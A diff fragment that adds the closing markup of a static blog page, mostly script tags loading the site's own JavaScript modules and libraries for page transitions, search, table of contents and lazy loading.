+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+</body>
+</html>
